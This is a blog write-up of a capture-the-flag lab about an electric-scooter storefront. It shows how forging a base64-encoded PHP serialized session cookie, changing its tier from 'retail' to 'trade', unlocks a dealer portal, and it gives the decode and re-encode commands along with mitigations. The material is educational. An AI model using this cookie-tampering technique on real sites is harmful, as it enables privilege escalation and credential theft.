---
title: "Insecure Deserialization Leads to Dealer Portal Access | Scooot"
date: 2026-06-25 12:05:00 +0530
categories: [A08 - Software and Data Integrity Failures, Insecure Deserialization]
tags: [webverse-pro, mystery-challenge, insecure-deserialization, php-serialization, cookie-tampering, access-control, owasp-2025]
platform: WebVerse Pro
author: Shivansh Sharma
image:
  path: /assets/images/posts/scooot-insecure-deserialization.webp
  alt: "Scooot insecure deserialization blog cover"
---

## Lab Link

[Scooot](https://dashboard.webverselabs-pro.com/mystery-challenges/scooot)

## Overview

Scooot is a WebVerse Pro mystery challenge built around an electric scooter storefront. The public application exposes a normal retail experience, while the trade portal is meant to be available only to approved dealer accounts.

The vulnerability was found in the `scoot_resume` cookie. Instead of storing only an opaque server-side session identifier, the application stored a Base64-encoded PHP serialized object directly inside the client-controlled cookie. By decoding the cookie, modifying the serialized `ShopperSession` object, and re-encoding it, the user-controlled session tier could be changed from `retail` to `trade`.

Once the forged session was accepted, the trade-only portal was unlocked and exposed the dealer API credential.

## Objective

The objective was to move from a normal retail visitor session to an approved trade account view and retrieve the hidden dealer credential.

## Scenario

The `/trade.php` page initially displayed a dealer access gate. It clearly showed that the current session was only a retail session:

```text
Approved trade accounts see the dealer tools.
Your session is a retail session right now, so there is nothing to manage here yet.
```

The page also hinted at the target data by mentioning that wholesale pricing, fleet ordering, and a dealer API credential were available only behind a trade account.

## Vulnerability Identification

| Field | Value |
| --- | --- |
| OWASP Top 10:2025 | A08 - Software and Data Integrity Failures |
| Vulnerability | Insecure Deserialization |
| Affected Component | `scoot_resume` cookie |
| Impact | Unauthorized trade portal access and dealer credential disclosure |
| Root Cause | Trusting a client-side serialized object as an authorization source |

The vulnerable cookie contained a Base64-encoded PHP serialized object:

```text
scoot_resume=<base64-encoded-php-serialized-object>
```

After decoding, the session object looked like this:

```php
O:14:"ShopperSession":3:{
  s:12:"display_name";s:5:"Guest";
  s:4:"cart";a:0:{}
  s:4:"tier";s:6:"retail";
}
```

The important authorization field was:

```php
s:4:"tier";s:6:"retail";
```

Because the application trusted this client-controlled value, changing it to `trade` was enough to alter the authorization state.

## Reconnaissance

The initial request to `/trade.php` showed that the application used a `scoot_resume` cookie alongside a Cloudflare clearance cookie.

```http
GET /trade.php HTTP/2
Host: <redacted-lab-host>
Cookie: cf_clearance=<redacted>; scoot_resume=<base64-session>
```

The response returned the trade gate instead of the dealer dashboard:

```html
<div class="label">Dealer access</div>
<h1>The dealer portal is for approved trade accounts</h1>
<p>
  Wholesale pricing, fleet ordering, and your dealer API credential live behind a trade account.
  Retail visitors see the storefront. Approved trade accounts see the dealer tools.
  Your session is a retail session right now, so there is nothing to manage here yet.
</p>
```

This confirmed that the trade page was reachable but authorization depended on the current session tier.

## Approach

The `scoot_resume` value looked like encoded state rather than a random session token. Decoding it revealed a PHP serialized object.

Original decoded object:

```php
O:14:"ShopperSession":3:{
  s:12:"display_name";s:5:"Guest";
  s:4:"cart";a:0:{}
  s:4:"tier";s:6:"retail";
}
```

The goal was to modify only the authorization-relevant field while keeping the serialized object valid.

The modified object changed the tier from `retail` to `trade`:

```php
O:14:"ShopperSession":3:{
  s:12:"display_name";s:5:"Guest";
  s:4:"cart";a:1:{
    i:0;
    O:8:"CartLine":2:{
      s:8:"model_id";i:1;
      s:3:"qty";i:1;
    }
  }
  s:4:"tier";s:5:"trade";
}
```

A valid PHP serialized string must preserve string length values. Since `retail` has 6 characters and `trade` has 5 characters, the serialized field had to become:

```php
s:4:"tier";s:5:"trade";
```

## Exploitation

### 1. Decode the Cookie

The `scoot_resume` cookie was Base64-decoded to inspect the PHP object.

```bash
printf '%s' '<scoot_resume-value>' | base64 -d
```

The decoded value showed a `ShopperSession` object with the tier set to `retail`.

### 2. Modify the Serialized Object

The authorization tier was changed from `retail` to `trade`.

Before:

```php
s:4:"tier";s:6:"retail";
```

After:

```php
s:4:"tier";s:5:"trade";
```

The object structure and string lengths were kept valid so PHP could deserialize it successfully.

### 3. Re-encode the Object

The modified serialized object was Base64-encoded again.

```bash
printf '%s' 'O:14:"ShopperSession":3:{s:12:"display_name";s:5:"Guest";s:4:"cart";a:1:{i:0;O:8:"CartLine":2:{s:8:"model_id";i:1;s:3:"qty";i:1;}}s:4:"tier";s:5:"trade";}' | base64 -w0
```

The new encoded value was then URL-encoded where required and placed back into the `scoot_resume` cookie.

### 4. Replay the Trade Portal Request

```http
GET /trade.php HTTP/2
Host: <redacted-lab-host>
Cookie: cf_clearance=<redacted>; scoot_resume=<modified-base64-session>
```

The server accepted the forged object and rendered the dealer dashboard instead of the retail gate.

## Proof of Exploitation

After replacing the cookie, `/trade.php` returned the trade-only portal:

```html
<div class="label">Dealer portal</div>
<h1>Halverson Mobility Group</h1>
<div class="who">Trade Tier 2 . Pacific Northwest . approved March 2024</div>
```

The portal also displayed the dealer API credential:

```text
WEBVERSE{.....}
```

The flag has been intentionally redacted for the public writeup.

## Root Cause

The application stored trusted authorization state inside a client-controlled cookie as a serialized PHP object.

The server treated the deserialized `tier` property as authoritative:

```php
$tier = $session->tier;
```

Because the object was not cryptographically signed, encrypted, or validated against server-side state, an attacker could modify the object and escalate from a retail session to a trade session.

## Impact

An attacker with a normal retail session could:

- Tamper with the serialized session object.
- Change their account tier to `trade`.
- Access the dealer-only portal.
- View wholesale account details.
- Retrieve a sensitive dealer API credential.

In a real application, this could lead to unauthorized ordering, abuse of wholesale pricing, exposure of internal integrations, and compromise of downstream dealer API workflows.

## Mitigation

### Store Authorization State Server-Side

Client cookies should contain only an opaque session identifier.

```php
session_start();

$_SESSION['user_id'] = $userId;
$_SESSION['tier'] = $tierFromDatabase;
```

The server should resolve privileges from trusted storage, not from user-controlled serialized data.

### Avoid Deserializing User-Controlled Data

Do not pass client-controlled values into `unserialize()`.

```php
// Unsafe
$session = unserialize($_COOKIE['scoot_resume']);
```

Use safer formats for non-sensitive preferences, and never use client-provided data as an authorization source.

### Sign Cookie Values

If state must be stored client-side, protect it with an HMAC and verify it before use.

```php
$payload = base64_encode(json_encode($data));
$signature = hash_hmac('sha256', $payload, $_ENV['COOKIE_SECRET']);

$cookie = $payload . '.' . $signature;
```

Before trusting the payload:

```php
[$payload, $signature] = explode('.', $_COOKIE['scoot_resume'], 2);

$expected = hash_hmac('sha256', $payload, $_ENV['COOKIE_SECRET']);

if (!hash_equals($expected, $signature)) {
    throw new RuntimeException('Invalid session cookie');
}
```

### Validate Authorization Against the Database

Even if a cookie says a user is a trade account, the backend should verify that status against a trusted record.

```php
$user = $users->findById($_SESSION['user_id']);

if ($user->tier !== 'trade') {
    http_response_code(403);
    exit('Forbidden');
}
```

### Rotate Exposed Credentials

Because the dealer API credential was exposed, it should be considered compromised.

Recommended actions:

- Revoke the exposed key.
- Issue a new dealer API credential.
- Review logs for suspicious trade API usage.
- Add monitoring for abnormal dealer ordering activity.

## Lessons Learned

- Serialized objects should never be trusted when they come from the client.
- Base64 is encoding, not protection.
- Authorization decisions must be based on server-side trusted state.
- PHP serialization is especially dangerous when used with user-controlled input.
- Cookie tampering can become privilege escalation when roles or tiers are stored client-side.

## Final Takeaway

Scooot was solved by identifying that the application stored a PHP serialized `ShopperSession` object inside a client-controlled cookie. By decoding the cookie, changing the `tier` property from `retail` to `trade`, and re-encoding the object, the dealer portal became accessible and exposed the trade-only API credential.
